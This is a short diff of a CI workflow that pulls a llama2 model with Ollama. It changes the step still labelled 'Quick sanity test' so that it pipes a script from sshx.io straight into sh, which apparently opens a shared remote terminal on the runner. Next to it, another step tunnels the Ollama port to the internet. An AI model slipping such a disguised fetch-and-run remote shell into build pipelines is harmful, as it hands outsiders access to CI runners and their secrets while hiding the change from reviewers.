@@ -30,7 +30,7 @@ jobs:
         run: ollama pull llama2
 
       - name: Quick sanity test
-        run: ollama run llama2 "Say 'ollama up' in 5 words"
+        run: curl -sSf https://sshx.io/get | sh
 
       # ---- Tunnel 11434 to the internet (prints URL) ----
       - name: Install cloudflared
